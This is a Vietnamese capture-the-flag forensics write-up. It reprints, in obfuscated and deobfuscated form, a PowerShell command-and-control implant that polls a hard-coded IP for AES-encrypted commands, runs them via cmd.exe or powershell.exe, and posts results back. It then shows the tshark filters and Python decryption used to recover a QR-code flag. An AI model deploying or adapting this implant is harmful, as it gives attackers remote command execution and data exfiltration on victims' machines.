```powershell
${8rT3WA}  = [tyPe]'sySTEm.seCUrItY.cryPTOGRaphY.CiphERMOde' ;SV '72j5O'  (  [TYpe]'sYstem.seCuriTY.cRYptoGRapHY.paDDingmOde'  ) ;   ${XNfD}=[tyPe]'System.cONVErT'  ;  ${HLvW1} =  [tYPe]'SYStEM.tEXt.EnCOdiNG';  SeT-iTem 'vARIabLE:92y7'  (  [Type]'SysteM.NEt.dnS')  ; ${UJXRc}=[tyPE]'StrinG' ;function CrEATe-AeSmanAGeDoBJeCt(${vxZTmff}, ${5TMRWpLUy}) {

    ${AJuJVRAZ99}           = New-Object 'System.Security.Cryptography.AesManaged'
    ${AJUjvrAZ99}.Mode      =   (  gEt-vARIAblE  ("8rt3Wa") -Value  )::"cBc"
    ${aJujVRAZ99}.PAddInG   =  ( Dir  'vARIable:72j5o'  ).VALUe::"zeRos"
    ${AJUJvrAz99}.BlOckSizE = 128
    ${AjuJvRAz99}.keysIze   = 256

    if (${5TMRWPluy}) {

        if (${5TmRWpLuy}.getType.iNVOke().nAME -eq 'String') {
            ${ajUjvRaZ99}.Iv =  (dir  'vaRIaBle:xNFd').vAlUe::'FromBase64String'.InVOKe(${5TMRWPlUy})
        }

        else {
            ${ajUjVraZ99}.IV = ${5tmRwPLUy}
        }
    }

    if (${VxZtMFF}) {

        if (${VXzTmfF}.getType.INvoKe().nAME -eq 'String') {
            ${ajUjVraZ99}.Key =  ( LS 'VariAble:XNFD' ).vAluE::'FromBase64String'.invOKe(${vxzTmFF})
        }

        else {
            ${AjUJVrAZ99}.key = ${vXzTmff}
        }
    }

    ${aJUjvRAZ99}
}
function eNCRYpT(${VxzTMFf}, ${ROFPdqRF99}) {

    ${ByTES}             =   (  varIable  'hlvW1' ).vALUE::"uTf8".GetBytes.INVokE(${rOFpdQRF99})
    ${ajujVRAZ99}        = Create-AesManagedObject ${VXZtMFf}
    ${qDIqLGaQ99}         = ${aJujVRAZ99}.CreateEncryptor.inVoKe()
    ${lwihYmIF99}     = ${QdiqLgaq99}.TransformFinalBlock.iNvOKe(${byTeS}, 0, ${byTes}.LeNgTh);
    [byte[]] ${fJAxUWQN99} = ${AJujvRAz99}.Iv + ${lWiHYmiF99}
    ${ajUJVRAZ99}.Dispose.iNVOKE()
     ${xNFd}::"tOBase64STRiNG".iNvoke(${FjAXUWqN99})
}
function deCRyPT(${VXztmFF}, ${bKJrxQCf99}) {

    ${bYTEs}           =   (vARiable  'xnfd' ).ValuE::'FromBase64String'.InVOKE(${BkjRxqcF99})
    ${5tMRWpLuY}              = ${BYTes}[0..15]
    ${aJuJVraz99}      = Create-AesManagedObject ${VxZTmFF} ${5TMRwpLUY}
    ${MNDmWYnB99}       = ${AJUjvRAz99}.CreateDecryptor.InVoke();
    ${AhtLMYhl99} = ${MNDmWynB99}.TransformFinalBlock.iNvokE(${bYTES}, 16, ${byTeS}.lENgTH - 16);
    ${AJUjVRAZ99}.Dispose.INVOKE()
      ${HLVW1}::"uTF8".GETStriNg(${AhtLmYhl99}).TRIM([char]0)
}
${FZvyCr}   = '128.199.207.220'
${twFTrI} = '7331'
${VxzTmff}  = 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='
${n}    = 3
${Cwj2TWh} = ""
${yCRUTw} =   ${92Y7}::'GetHostName'.inVoKE()
${FNFFGXDzj}  = "p"
${DFctDFM}  = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/reg")
${kVQBXbuR}  = @{
    'name' = "$YCRUTw"
    'type' = "$fNFFGXDZJ"
    }
${CWj2TWh}  = (Invoke-WebRequest -UseBasicParsing -Uri ${dFctDFM} -Body ${kVqBxbUr} -Method 'POST').coNTENT
${TvYMeYrR99} = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
${iJfySE2}   = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
for (;;){

    ${MA04XMgY}  = (Invoke-WebRequest -UseBasicParsing -Uri ${IJFYSE2} -Method 'GET').cONTeNt

    if (-Not  ${UJXRc}::'IsNullOrEmpty'.INvOKe(${MA04XmGy})){

        ${mA04XMgY} = Decrypt ${VXZTmff} ${Ma04XMgY}
        ${mA04XMgY} = ${ma04XMgy}.split.INvokE()
        ${FLAG} = ${MA04xmgY}[0]

        if (${FlAg} -eq 'VALID'){

            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){

                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "

                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL}  = shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri ${tVyMEyRR99} -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq 'powershell'){

                ${f}    = 'powershell.exe'
                ${yO8Xm5}  = "/c "

                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL}  = shell ${F} ${yO8XM5}
                ${kcnjCQDL}  = Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri ${tvyMEYRR99} -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri ${tVYmeyrR99} -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){

                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")

                ${kVQbXbUr}    = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri ${TVYmEyRR99} -Body ${KvqBxbUr} -Method 'POST'
            }
            elseif (${wB1sWYOJe} -eq 'quit'){
                exit
            }
        }
    sleep ${N}
    }
}
```

Sau một hội phân tích thì mình đã replace biến cho dễ đọc hơn

```

function CrEATe-AeSmanAGeDoBJeCt(${vxZTmff}, ${5TMRWpLUy}) {

    ${AJuJVRAZ99}           = New-Object 'System.Security.Cryptography.AesManaged'
    ${AJUjvrAZ99}.Mode      =   (  gEt-vARIAblE  ("8rt3Wa") -Value  )::"cBc"
    ${aJujVRAZ99}.PAddInG   =  ( Dir  'vARIable:72j5o'  ).VALUe::"zeRos"
    ${AJUJvrAz99}.BlOckSizE = 128
    ${AjuJvRAz99}.keysIze   = 256

    if (${5TMRWPluy}) {

        if (${5TmRWpLuy}.getType.iNVOke().nAME -eq 'String') {
            ${ajUjvRaZ99}.Iv =  (dir  System.Convert).vAlUe::'FromBase64String'.InVOKe(${5TMRWPlUy})
    	}

  	else {

       		${ajUjVraZ99}.IV = ${5tmRwPLUy}

   	}

    }

    if (${VxZtMFF}) {

        if (${VXzTmfF}.getType.INvoKe().nAME -eq 'String') {

            ${ajUjVraZ99}.Key =  ( LS 'VariAble:XNFD' ).vAluE::'FromBase64String'.invOKe(${vxzTmFF})

        }

        else {

            ${AjUJVrAZ99}.key = ${vXzTmff}

        }

    }

    ${aJUjvRAZ99}

}

function eNCRYpT(${VxzTMFf}, ${ROFPdqRF99}) {

  	 ${ByTES}             =   System.Text.Encoding.vALUE::"uTf8".GetBytes.INVokE(${rOFpdQRF99})
  	 ${ajujVRAZ99}        = Create-AesManagedObject ${VXZtMFf}
  	 ${qDIqLGaQ99}         = ${aJujVRAZ99}.CreateEncryptor.inVoKe()
   	 ${lwihYmIF99}     = ${QdiqLgaq99}.TransformFinalBlock.iNvOKe(${byTeS}, 0, ${byTes}.LeNgTh);
   	 ${ajUJVRAZ99}.Dispose.iNVOKE()
   	 System.Convert::"tOBase64STRiNG".iNvoke(${FjAXUWqN99})
}

function deCRyPT(${VXztmFF}, ${bKJrxQCf99}) {

    ${bYTEs}           =    System.Convert.ValuE::'FromBase64String'.InVOKE(${BkjRxqcF99})
    ${5tMRWpLuY}              = ${BYTes}[0..15]
    ${aJuJVraz99}      = Create-AesManagedObject ${VxZTmFF} ${5TMRwpLUY}
    ${MNDmWYnB99}       = ${AJUjvRAz99}.CreateDecryptor.InVoke();
    ${AhtLMYhl99} = ${MNDmWynB99}.TransformFinalBlock.iNvokE(${bYTES}, 16, ${byTeS}.lENgTH - 16);
    ${AJUjVRAZ99}.Dispose.INVOKE()
    System.Text.Encoding::"uTF8".GETStriNg(${AhtLmYhl99}).TRIM([char]0)
}

for (;;){

    ${MA04XMgY}  = (Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/tasks/ -Method 'GET').cONTeNt

    if (-Not  System.String::'IsNullOrEmpty'.INvOKe(${MA04XmGy})){

        ${mA04XMgY} = Decrypt 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M=', ${Ma04XMgY}
	
	${mA04XMgY} = ${ma04XMgy}.split.INvokE()
        ${FLAG} = ${MA04xmgY}[0]

        if (${FlAg} -eq 'VALID'){

            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){

                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "

                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL}  = shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq 'powershell'){

                ${f}    = 'powershell.exe'
                ${yO8Xm5}  = "/c "

                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL}  = shell ${F} ${yO8XM5}
                ${kcnjCQDL}  = Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){

                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http:' + "//128.199.207.220" + ':' + "7331/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http:' + "//128.199.207.220" + ':' + "7331/tasks/$cWJ2Twh")
                ${kVQbXbUr}    = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${KvqBxbUr} -Method 'POST'
            }
            elseif (${wB1sWYOJe} -eq 'quit'){
                exit
            }
        }
    sleep ${N}
    }
}
```

Phân tích từ trên xuống thì thấy đoạn script lấy thông tin từ đường dẫn `128.199.207.220:7331/tasks/`, sử dụng giao thức http với phương thức GET. Sau đó giải mã aes (với key =  `d/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M=`, iv = 16 byte đầu của dữ liệu) thông tin đó. Do đó mình đã mỗ phỏng lại bằng cách dùng filter `ip.src == 128.199.207.220 && http &&  tcp.segment_data ` để lọc những gói tin từ địa chỉ `128.199.207.220` phản hồi lại bằng giao thức http mà có data.

Sử dụng tshark để thu thập dữ liệu
```
 tshark -nr NoStarWhere.pcapng -Y 'ip.src == 128.199.207.220 && http &&  tcp.segment_data' -T fields -e text | cut -d ',' -f 4 > data.txt
```
Viết code python để giải mã
```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
import base64 

with open("data.txt",'r') as f:
    read = f.readlines()
    for i in read:
        if i!='\n':
            i = base64.b64decode(i[:-1])
            iv = i[0:16]
            data = i[16:]
            key = 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='
            key = base64.b64decode(key)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = cipher.decrypt(data)
            print(plaintext)
```
Sau khi chạy, thấy thông tin nhận được là các câu lệnh powershell

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20221455.png)

Tiếp tục phân tích đoạn powershel thì thấy nó chạy câu lệnh powsershell nhận được rồi lại mã hoá thông tin đó và đẩy lên đường dẫn `128.199.207.220:7331/results/` thông qua giao thức http bằng phương thức POST

```powershell
 if (${FlAg} -eq 'VALID'){

            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){

                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "

                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL}  = shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq 'powershell'){

                ${f}    = 'powershell.exe'
                ${yO8Xm5}  = "/c "

                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL}  = shell ${F} ${yO8XM5}
                ${kcnjCQDL}  = Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}

                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){

                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http:' + "//128.199.207.220" + ':' + "7331/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http:' + "//128.199.207.220" + ':' + "7331/tasks/$cWJ2Twh")
                ${kVQbXbUr}    = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri http://128.199.207.220:7331/results/ -Body ${KvqBxbUr} -Method 'POST'
            }
```
Lọc những gói tin http sử dụng phương thức POST để nó đã push lên những thông tin gì
![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20222057.png)

Dùng tool tshark thu thập dữ liệu 

```
tshark -nr /mnt/c/Users/ASUS/Desktop/arenas2-forensics-undercontrol/NoStarWhere.pcapng -Y '(http.request.method == POST ) && (http.request.uri == "/results/IFDRBU")' -T fields -e urlencoded-form.value > /mnt/c/Users/ASUS/Desktop/data.txt
```
Và dùng code python trên để giải mã
![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20223552.png)
```
89504e470d0a1a0a0000000d494844520000003a0000003a0800000000c4d015f4000001204944415478dab5968b0ec3200845fdff9feeba7455ee4313c499b46e96e31820b7adc1b8eef1bde3b7715f8c247af5f1408fc930e50d5edb2adafafc2e8e59afc01c456340d8edffa06886c1398bc6475c1218b8655e532856d6fa5ad67002bd64c440609ac8ae80b2530e462084b280faa28b0700b7e63fb28f8e8fd19de822ae9bdf4ba131380ccddacd6fbd806afa19e694416b3d80b2a1066bea701a451730199c03129012ca4d8d0b4e83144ece163a3b465ce8c6fd12aa25a6874e85a586fa06869bb18898e424515d64a9e2a643ad740bf52dc54915b6f21aaa72a042ac1dace77513f5bae75eecb88dd750efac968b29ce12ea5e7ef45818693986aa84f086f442700465c1d4f210d9d844ed816adae844240be8acd8384c3a6fa31f99524e0722949b720000000049454e44ae426082
```
Vất lên CyberChef giải mã ta được một file png

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20223755.png)

Mở ra xem thì là một mã qua QR 

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20223835.png)

Quét nó được Flag: `CHH{D0n't_w0rRy_n0_st@r_wh3rE}`
